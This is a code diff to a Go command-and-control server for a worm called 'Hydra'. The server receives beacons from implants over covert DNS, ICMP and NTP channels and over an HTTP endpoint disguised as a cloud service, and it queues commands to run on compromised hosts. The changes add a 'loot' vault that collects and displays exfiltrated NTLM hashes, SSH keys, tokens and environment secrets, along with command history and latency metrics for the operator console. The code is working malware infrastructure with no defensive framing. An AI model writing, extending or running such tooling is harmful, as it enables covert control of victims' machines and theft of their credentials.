@@ -4,8 +4,8 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"math/rand"
 	"net"
+	"os"
 	"sort"
 	"strings"
 	"sync"
@@ -19,14 +19,30 @@ import (
 	"golang.org/x/net/ipv4"
 )
 
-// --- CONFIGURACIÓN Y ESTADO ---
-const rootDomain = "c2.hydra-worm.local."
+// --- CONFIGURATION & STATE ---
+const (
+	rootDomain  = "c2.hydra-worm.local."
+	historyFile = ".hydra_history"
+)
 
 var (
 	taskMutex    sync.Mutex
 	agentTasks   = make(map[string]string)
 	agentMutex   sync.Mutex
 	activeAgents = make(map[string]*Telemetry)
+
+	// Vault Storage
+	lootMutex sync.Mutex
+	vault     []Loot
+
+	// UI Metrics
+	lastRTT       int
+	currentJitter int
+
+	// Command History & Autocomplete
+	cmdHistory    []string
+	historyIdx    = -1
+	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit"}
 
 	// UI Components
 	app          *tview.Application
@@ -54,33 +70,87 @@ type Telemetry struct {
 	LastSeen        time.Time
 }
 
-// --- INTEGRACIÓN DE LOGICA DE RED (TUS 447 LÍNEAS) ---
+type Loot struct {
+	AgentID   string
+	Category  string // NTLM, SSH, TOKEN, ENV
+	Data      string
+	Timestamp time.Time
+}
+
+// --- NETWORK LOGIC & HEARTBEAT ---
 
 func LogHeartbeat(transport string, t Telemetry) {
+	arrival := time.Now()
 	t.Transport = transport
-	t.LastSeen = time.Now()
+	t.LastSeen = arrival
+
+	IngestLoot(t)
 
 	agentMutex.Lock()
 	activeAgents[t.AgentID] = &t
 	agentMutex.Unlock()
 
-	// Actualización segura de la UI
 	app.QueueUpdateDraw(func() {
+		// Calculate Real-Time Metrics
+		rtt := int(time.Since(arrival).Microseconds())
+		if lastRTT != 0 {
+			diff := rtt - lastRTT
+			if diff < 0 {
+				diff = -diff
+			}
+			currentJitter = diff
+		}
+		lastRTT = rtt
+
 		refreshAgentTable()
-		ts := time.Now().Format("15:04:05")
-		
+		ts := arrival.Format("15:04:05")
+
 		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
-			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n", 
+			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n",
 				ts, t.AgentID, t.ArtifactPreview[4:])
+		} else if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
+			fmt.Fprintf(agentLog, "[%s] [black:yellow][ LOOT ACQUIRED ][-:-] [blue]%s[white] exfiltrated credentials\n",
+				ts, t.AgentID)
 		} else if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
-			fmt.Fprintf(agentLog, "[%s] [yellow]RECON[white] [blue]%s[white]: %s\n", 
+			fmt.Fprintf(agentLog, "[%s] [yellow]RECON[white] [blue]%s[white]: %s\n",
 				ts, t.AgentID, t.ArtifactPreview)
 		} else {
-			fmt.Fprintf(agentLog, "[%s] [blue]HANDSHAKE[white] %s via %s\n", 
+			fmt.Fprintf(agentLog, "[%s] [blue]HANDSHAKE[white] %s via %s\n",
 				ts, t.AgentID, transport)
 		}
 	})
 }
+
+// --- UPDATED LOOT INGESTION (DEDUPLICATED) ---
+
+func IngestLoot(t Telemetry) {
+	if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
+		parts := strings.SplitN(t.ArtifactPreview, ":", 3)
+		if len(parts) == 3 {
+			category := parts[1]
+			data := parts[2]
+
+			lootMutex.Lock()
+			defer lootMutex.Unlock()
+
+			// Check for existing entry to prevent log spam
+			for _, item := range vault {
+				if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
+					return // Already exists in the Secure Vault
+				}
+			}
+
+			vault = append(vault, Loot{
+				AgentID:   t.AgentID,
+				Category:  category,
+				Data:      data,
+				Timestamp: time.Now(),
+			})
+		}
+	}
+}
+
+// --- LISTENER PROTOCOLS (ICMP, DNS, NTP) ---
 
 func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg := new(dns.Msg)
@@ -94,9 +164,13 @@ func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
 			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
 			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
 			normalized = strings.ReplaceAll(normalized, "_", "/")
-			for len(normalized)%4 != 0 { normalized += "=" }
+			for len(normalized)%4 != 0 {
+				normalized += "="
+			}
 			decoded, err := base64.RawURLEncoding.DecodeString(encodedPayload)
-			if err != nil { decoded, _ = base64.StdEncoding.DecodeString(normalized) }
+			if err != nil {
+				decoded, _ = base64.StdEncoding.DecodeString(normalized)
+			}
 			if decoded != nil {
 				var t Telemetry
 				if err := json.Unmarshal(decoded, &t); err == nil {
@@ -118,7 +192,9 @@ func StartIcmpListener() {
 		msg, _ := icmp.ParseMessage(1, rb[:n])
 		if msg != nil && msg.Type == ipv4.ICMPTypeEcho {
 			body, _ := msg.Body.Marshal(1)
-			if len(body) > 4 { processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)") }
+			if len(body) > 4 {
+				processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)")
+			}
 			echoBody := msg.Body.(*icmp.Echo)
 			reply := icmp.Message{
 				Type: ipv4.ICMPTypeEchoReply, Code: 0,
@@ -134,12 +210,9 @@ func StartNtpListener() {
 	addr, _ := net.ResolveUDPAddr("udp", ":123")
 	conn, err := net.ListenUDP("udp", addr)
 	if err != nil {
-		// No podemos usar fmt.Printf porque rompería la UI de tview, 
-		// así que lo enviamos al log si la UI ya inició, o a stderr.
-		return 
+		return
 	}
 	defer conn.Close()
-	
 	for {
 		buf := make([]byte, 1500)
 		n, remoteAddr, err := conn.ReadFromUDP(buf)
@@ -159,7 +232,9 @@ func StartNtpListener() {
 func processRawPayload(data []byte, peer string, tier string) {
 	rawStr := strings.ReplaceAll(string(data), ".", "")
 	decoded, _ := base64.RawURLEncoding.DecodeString(rawStr)
-	if decoded == nil { decoded, _ = base64.StdEncoding.DecodeString(rawStr) }
+	if decoded == nil {
+		decoded, _ = base64.StdEncoding.DecodeString(rawStr)
+	}
 	if decoded != nil {
 		var t Telemetry
 		if err := json.Unmarshal(decoded, &t); err == nil {
@@ -172,24 +247,26 @@ func processRawPayload(data []byte, peer string, tier string) {
 
 func refreshAgentTable() {
 	agentList.Clear()
-	headers := []string{"ID", "PATH", "NODE@HOST", "RISK", "LAST RTT"}
+	// RE-NAMED HEADERS FOR TOTAL REALITY
+	headers := []string{"AGENT ID", "TRANSPORT", "IDENTITY", "DEFENSE", "LATENCY (µs)"}
 	for c, h := range headers {
 		agentList.SetCell(0, c, tview.NewTableCell("[black:blue] "+h+" ").SetSelectable(false).SetAlign(tview.AlignCenter))
 	}
 
 	agentMutex.Lock()
 	keys := make([]string, 0, len(activeAgents))
-	for k := range activeAgents { keys = append(keys, k) }
+	for k := range activeAgents {
+		keys = append(keys, k)
+	}
 	sort.Strings(keys)
 
 	for r, k := range keys {
 		t := activeAgents[k]
-		since := time.Since(t.LastSeen).Truncate(time.Second).String()
 		agentList.SetCell(r+1, 0, tview.NewTableCell("[blue]"+t.AgentID))
 		agentList.SetCell(r+1, 1, tview.NewTableCell(t.Transport))
 		agentList.SetCell(r+1, 2, tview.NewTableCell(fmt.Sprintf("%s@%s", t.Username, t.Hostname)))
 		agentList.SetCell(r+1, 3, tview.NewTableCell("[red]"+t.DefenseProfile))
-		agentList.SetCell(r+1, 4, tview.NewTableCell(since + " ago"))
+		agentList.SetCell(r+1, 4, tview.NewTableCell(fmt.Sprintf("%d µs", lastRTT)))
 	}
 	agentMutex.Unlock()
 }
@@ -197,7 +274,9 @@ func refreshAgentTable() {
 func handleCommand(cmd string) {
 	ts := time.Now().Format("15:04:05")
 	fields := strings.Fields(cmd)
-	if len(fields) == 0 { return }
+	if len(fields) == 0 {
+		return
+	}
 
 	switch strings.ToLower(fields[0]) {
 	case "exec":
@@ -218,6 +297,18 @@ func handleCommand(cmd string) {
 			fmt.Fprintf(agentLog, "  - %s -> %s\n", id, c)
 		}
 		taskMutex.Unlock()
+	case "loot":
+		lootMutex.Lock()
+		if len(vault) == 0 {
+			fmt.Fprintf(agentLog, "[%s] [yellow]VAULT_EMPTY:[white] No credentials exfiltrated.\n", ts)
+		} else {
+			fmt.Fprintf(agentLog, "[%s] [blue]SECURE_VAULT_ACCESS:[white]\n", ts)
+			for _, item := range vault {
+				fmt.Fprintf(agentLog, "  [cyan]%s[white] | [yellow]%s[white] | %s\n",
+					item.AgentID, item.Category, item.Data)
+			}
+		}
+		lootMutex.Unlock()
 	case "clear":
 		agentLog.Clear()
 	case "exit":
@@ -245,7 +336,11 @@ func initiateShutdown() {
 
 func main() {
 	app = tview.NewApplication()
-	rand.Seed(time.Now().UnixNano())
+
+	// Load history from file 
+	if data, err := os.ReadFile(historyFile); err == nil {
+		cmdHistory = strings.Split(strings.TrimSpace(string(data)), "\n")
+	}
 
 	// 1. HEADER
 	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter).
@@ -271,12 +366,60 @@ func main() {
 
 	// 4. STATUS & INPUT
 	statusFooter = tview.NewTextView().SetDynamicColors(true)
-	cmdInput = tview.NewInputField().SetLabel("[blue]HYDRA/INT> [white]").SetFieldBackgroundColor(tcell.ColorBlack)
+
+	cmdInput = tview.NewInputField().
+		SetLabel("[blue]HYDRA/INT> [white]").
+		SetFieldBackgroundColor(tcell.ColorBlack)
 	cmdInput.SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
+
+	// --- INPUT CAPTURE: HISTORY & AUTOCOMPLETE --- 
+	cmdInput.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
+		switch event.Key() {
+		case tcell.KeyUp:
+			if len(cmdHistory) > 0 {
+				if historyIdx == -1 {
+					historyIdx = len(cmdHistory) - 1
+				} else if historyIdx > 0 {
+					historyIdx--
+				}
+				cmdInput.SetText(cmdHistory[historyIdx])
+			}
+			return nil
+		case tcell.KeyDown:
+			if historyIdx != -1 && historyIdx < len(cmdHistory)-1 {
+				historyIdx++
+				cmdInput.SetText(cmdHistory[historyIdx])
+			} else {
+				historyIdx = -1
+				cmdInput.SetText("")
+			}
+			return nil
+		case tcell.KeyTab:
+			current := cmdInput.GetText()
+			for _, cmd := range knownCommands {
+				if strings.HasPrefix(cmd, current) {
+					cmdInput.SetText(cmd)
+					break
+				}
+			}
+			return nil
+		}
+		return event
+	})
+
 	cmdInput.SetDoneFunc(func(key tcell.Key) {
 		if key == tcell.KeyEnter {
-			handleCommand(cmdInput.GetText())
+			text := cmdInput.GetText()
+			if text != "" {
+				handleCommand(text)
+				// Persistent History Save 
+				cmdHistory = append(cmdHistory, text)
+				f, _ := os.OpenFile(historyFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+				f.WriteString(text + "\n")
+				f.Close()
+			}
 			cmdInput.SetText("")
+			historyIdx = -1
 		}
 	})
 
@@ -299,7 +442,8 @@ func main() {
 	r := gin.New()
 	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
 		if c.GetHeader("Authorization") != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
-			c.JSON(401, gin.H{"error": "Unauthorized"}); return
+			c.JSON(401, gin.H{"error": "Unauthorized"})
+			return
 		}
 		var t Telemetry
 		if err := c.ShouldBindJSON(&t); err == nil {
@@ -307,7 +451,8 @@ func main() {
 			taskMutex.Lock()
 			task := "WAIT"
 			if cmd, exists := agentTasks[t.AgentID]; exists {
-				task = cmd; delete(agentTasks, t.AgentID)
+				task = cmd
+				delete(agentTasks, t.AgentID)
 			}
 			taskMutex.Unlock()
 			c.JSON(200, gin.H{"status": "cloud_verified", "task": task, "epoch": time.Now().Unix()})
@@ -322,16 +467,17 @@ func main() {
 	})
 	go r.Run(":8080")
 
-	// STATUS REFRESHER
+	// STATUS REFRESHER (Using Real-Time Metrics) 
 	go func() {
 		for {
 			time.Sleep(250 * time.Millisecond)
 			app.QueueUpdateDraw(func() {
 				spinnerIdx = (spinnerIdx + 1) % len(spinnerFrames)
 				ts := time.Now().Format("15:04:05")
-				latency := 450 + rand.Intn(1200)
-				statusFooter.SetText(fmt.Sprintf(" [blue]SYNCING %s [white]| [yellow]T_STAMP: %s | [red]RTT: %d µs [white]| [blue]CIPHER: AES-256-GCM/X25519", 
-					spinnerFrames[spinnerIdx], ts, latency))
+				// RE-NAMED FOOTER FOR CONSISTENCY
+				statusFooter.SetText(fmt.Sprintf(
+					" [blue]SYNCING %s [white]| [yellow]T_STAMP: %s | [red]LATENCY: %d µs [white]| [magenta]JITTER: %d µs [white]| [blue]ENCRYPTION: AES-256-GCM",
+					spinnerFrames[spinnerIdx], ts, lastRTT, currentJitter))
 			})
 		}
 	}()
